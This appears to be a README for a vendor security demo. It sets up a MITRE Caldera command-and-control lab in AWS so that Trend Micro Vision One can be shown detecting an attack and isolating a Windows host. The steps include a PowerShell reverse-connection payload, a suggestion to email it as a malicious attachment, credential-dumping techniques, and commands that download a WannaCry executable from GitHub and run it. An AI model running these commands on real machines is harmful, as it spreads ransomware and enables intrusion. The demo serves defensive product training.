# Trend Micro Vision One Demo

__Requirements:

Windows/Mac/Linux OS
- AWS Account
- RDP/SSH Client
- Google Chrome or Mozilla Firefox

__Prepaing the Demo Environment:

- Deploy the Cloud Formation Template (Make sure you are using the us-west-1 region)
The following information has to be provided:
-Stack name - Name of the stack you are creating (example XDR-Demo)
-KeyName - KeyPar to be used when creating the EC2 Instances
-Platform - Select the appropriate platform (VisionOne, C1WS or ApexOne). Based on your selection, the following information has be provided
--PlatformURL - If you selected ApexOne or VisionOne, add the AgentInstallationURL (ApexOne Agent Installer or VisionOne Basecamp)
--TenantID and Token - If you selected C1WS, you have to get the TennantID and Token to be used installing and activating the agent. You can get this information using the C1WS > Deployment Scripts

__Testing the demo environment

After the CFT deployment is finished, you need to access the Windows Instance using RDP. You can get the credentials following the procedure described here https://docs.aws.amazon.com/AWSEC2/latest/WindowsGuide/connecting_to_windows_instance.html

After connecting to your RDP Session, make sure you can access the Caldera Management Console (http://linux-ip). username/password - admin/admin)

Also, you must make sure the Windows Instance is registered in your VisionOne/ApexOne/C1WS Management Console. Also, make sure the EDR feature is enabled (This will require a specific policy -for ApexOne or C1WS- or the EDR feature to be enabled manually, in case you are using VisionOne).

Using the VisionOne Portal, you must make sure that you have created a Secure Access Rule to automatically isolate devices with a (persistent) Risk Level of 60 or Higher (once matched).

__What to expect from this demo!

This demo script was created to demonstrate the following use case:
+ Attacker trying to get the control of an Windows Instance
+ Attacker is using Mitre Caldera as C&C Server
++ Using Mitre Caldera, the Attacker will generate one malicious payload (powershell). This malicious payload will generate a reverse connection between the Windows Instance and the C&C Server.
++ The Attacker, using the Mitre Caldera, will use the tools available on Mitre Caldera to start checking some conditions and extracting sensitive data from the Windows Computer
++ The Trend Micro XDR agent is monitoring all the actions happening to the Windows Computer. The Risk Level of this device is increasing and it is becoming of of the riskiest devices of this demo environment.
++ The attacker will finish the attack encrypting the Windows Device, to make the impact of this attack even bigger.
++ Because of the policies in place, once the device' risk level reaches 60, the Windows Device will be automatically isolated.

__How to demo

1- Open the RDP Session and show the basecamp components running on background;
2- Open the VisionOne Dashboard, and show the Actual Risk Level of this Windows Computer;
3- Open the Mitre Caldera Management Console, and create a new malicious payload
--Navigate > Agents > Click Here to Deploy an Agent > Select the "54ndc47" agent and Select the Windows Platform
--Replace the "app.contact.http" information with the Linux IP Address (example http://linux-ip)
--Copy the Powershell script created for this agent
4- Execute the powershell script on the Windows Instance

Optional (in case you want to demonstrate it in conjunction with CAS)
4- Access the following website https://ps2exe.azurewebsites.net/ and generate an executable file using the powershell script you've copied in the previous step
4.1- Send an email with the malicious attachment to the target user

5- After you execute the PS script on the Windows Instance, you will find a new Client connected to the Mitre Caldera Portal (You can find it on Navigate > Agents manu)
6- Now selecte the Navigate > Operations menu. We will use this option to start the operation following that Demo Script described previously on this page.
7- Select the New Operation (name it as DemoXDR)
8- Select the option Manual Command > Select your Agent > Run the command "Hostname". You will notice that after 1 minute +- the status of this request will become green. That means the command was executed successfuly. You can check the output clicking on the "star" icon, in the right side of the command you executed.
9- Now select the option named "Potential Links". Using this option you can search through the Mitre Techniques, and test them as you believe will generate the best impact (based on the objectives you have for this demo).
10- The following Mitre Techniques can help you to increase the risk level of the Windows Machine quickly, so if you want, this could be the best path to follow and have the Automated Response actions triggered.
10.1- T1059.001, T1059.001, T1113, T1115, T1105, T1105, T1003.001, T1055.002, T1003.001, T1059.001, T1059.001, T1548.002, T1496, T1491
11- Check the VisionOne Portal, wait for the new logs (+-5 minutes) and look to the Risk Level of the Windows Instance. The number is increasing, right?
12- Check now the Observed Attack Techniques and the Workbenches. You will also find many detections! Its a good moment to show to your customer how to investigate and find what was detected or not by VisionOne.
13- After you showed all the information detected by VisionOne, it's time to drop the Ransomware file to the Windows Machine, and make sure the ransomware was executed successfuly.
13.1- To do that, select the Navigate > Operations. Create a new Operation named Ransomware.
13.2- Select the "Manual Command" Option, Select your target, then select the PS> interpreter.
13.3- Run the following commands "Invoke-WebRequest -Uri https://github.com/limiteci/WannaCry/raw/main/WannaCry.EXE -OutFile wcry.exe"
14.4- After the first command was successfuly executed, run the next command "Start-Process wcry.exe"
15- If you check the Windows Instance a few seconds later, you will find the machine is encrypted. In a 5 minutes period of time, if the Secure Access Rules you've created is enabled, you should lost the RDP Access to your Windows Instance. That means the VisionOne was able to detect the changes on the Risk Level, and then followed with the automated isolation for any devices with risk level >=60.
16- You can check the detection logs and actions using the VisionOne Portal. You can go through the Device Risk Level, Workbenches, Observed Attack Techniques and Response Management menus, which will highlight all the detections and actions takes due to this new high risk computer detected during this demo.


https://ps2exe.azurewebsites.net/

